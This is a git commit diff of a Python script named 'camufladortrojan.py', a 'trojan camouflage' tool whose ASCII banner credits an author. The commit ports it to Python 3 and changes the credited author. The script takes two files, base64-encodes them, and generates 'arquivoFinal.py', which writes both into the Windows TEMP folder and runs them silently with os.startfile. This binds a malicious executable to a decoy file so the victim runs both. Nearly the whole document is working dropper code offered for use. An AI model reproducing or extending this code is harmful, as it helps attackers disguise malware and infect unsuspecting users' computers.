c496fd59a8806b215152fd6cf979c5ab6fe1d753
n3ur0m4nc3r <33128932+n3ur0m4ncr@users.noreply.github.com>
2023-11-05 19:19:28 -0300

    camufladortrojan.py

--- camufladortrojan.py
+++ camufladortrojan.py
@@ -1,7 +1,6 @@
-﻿import sys
+import sys
 import os
 import base64
-
 
 BLUE = '\33[94m'
 LightBlue = '\033[94m'
@@ -9,14 +8,13 @@ RED = '\033[91m'
 WHITE = '\33[97m'
 YELLOW = '\33[93m'
 GREEN = '\033[32m'
-LightCyan    = "\033[96m"
+LightCyan = "\033[96m"
 END = '\033[0m'
 
 if len(sys.argv) < 2:
-    sys.stdout.write(RED + """  
-  
+    print(RED + """  
     
-
+    
  ▄████▄   ▄▄▄       ███▄ ▄███▓ █    ██   █████▒██▓    ▄▄▄      ▓█████▄  ▒█████   ██▀███  ▄▄▄█████▓ ██▀███   ▒█████   ▄▄▄██▀▀▀▄▄▄       ███▄    █ 
 ▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒ ██  ▓██▒▓██   ▒▓██▒   ▒████▄    ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒   ▒██  ▒████▄     ██ ▀█   █ 
 ▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░▓██  ▒██░▒████ ░▒██░   ▒██  ▀█▄  ░██   █▌▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ░██  ▒██  ▀█▄  ▓██  ▀█ ██▒
@@ -30,29 +28,29 @@ if len(sys.argv) < 2:
 
                                                                                    
                                                                                           
-    """  + END+BLUE+'GitHub: https://github.com/shangow'.format(RED, END).center(69) +
-    '\n' + '\tAutor: {}shangow'.format(YELLOW, RED, YELLOW, BLUE).center(76) +
-    '\n' + '\tVersion: {}1.0{}\n'.format(YELLOW, END).center(80) + '\n')
-    
+    """ + END + BLUE + 'GitHub: https://github.com/n3ur0m4ncr'.format(RED, END).center(69) +
+    '\n' + '\tAutor: {}n3ur0m4ncr'.format(YELLOW, RED, YELLOW, BLUE).center(76) +
+    '\n' + '\tVersion: {}2.0{}'.format(YELLOW, END).center(80) + '\n')
 
-arquivo1 = raw_input('Primeiro arquivo: ') #1
-arquivo2 = raw_input('Segundo arquivo: ') 
+arquivo1 = input('Primeiro arquivo: ')  # 1
+arquivo2 = input('Segundo arquivo: ')  # 2
 
-nomeArquivo1 = os.path.basename(arquivo1) #2
-nomeArquivo2 = os.path.basename(arquivo2)
+nomeArquivo1 = os.path.basename(arquivo1)  # 3
+nomeArquivo2 = os.path.basename(arquivo2)  # 4
 
-with open(arquivo1, 'rb') as arquivo1Aberto: #3
-    with open(arquivo2, 'rb') as arquivo2Aberto:
-        with open('arquivoFinal.py', 'w') as arquivo_gerado: #4
-            arquivo_gerado.write('''import os, base64 #5
-def join(conteudoBinario,nomeArquivo): #6
-    if not os.path.exists(os.environ["TEMP"] + "\\\\" + nomeArquivo): #7
-        with open(os.environ["TEMP"]+ "\\\\" + nomeArquivo, "wb") as arquivoTemporario: #8
-            arquivoTemporario.write(conteudoBinario) #9
-    os.startfile(os.environ["TEMP"]+ "\\\\" + nomeArquivo) #10
-arquivo1base64 = "%s" #11
-join(base64.b64decode(arquivo1base64), "%s") #12
-arquivo2base64 = "%s" #13
-join(base64.b64decode(arquivo2base64), "%s") #14
-''' %(base64.b64encode(arquivo1Aberto.read()), nomeArquivo1, \
-      base64.b64encode(arquivo2Aberto.read()), nomeArquivo2)) #15
+with open(arquivo1, 'rb') as arquivo1Aberto, \
+     open(arquivo2, 'rb') as arquivo2Aberto, \
+     open('arquivoFinal.py', 'w') as arquivo_gerado:  # 5
+
+    arquivo_gerado.write('''import os, base64  # 6
+def join(conteudoBinario, nomeArquivo):  # 7
+    if not os.path.exists(os.environ["TEMP"] + "\\\\" + nomeArquivo):  # 8
+        with open(os.environ["TEMP"] + "\\\\" + nomeArquivo, "wb") as arquivoTemporario:  # 9
+            arquivoTemporario.write(conteudoBinario)  # 10
+    os.startfile(os.environ["TEMP"] + "\\\\" + nomeArquivo)  # 11
+arquivo1base64 = "{}"  # 12
+join(base64.b64decode(arquivo1base64), "{}")  # 13
+arquivo2base64 = "{}"  # 14
+join(base64.b64decode(arquivo2base64), "{}")  # 15
+'''.format(base64.b64encode(arquivo1Aberto.read()).decode('utf-8'), nomeArquivo1,
+           base64.b64encode(arquivo2Aberto.read()).decode('utf-8'), nomeArquivo2))  # 16
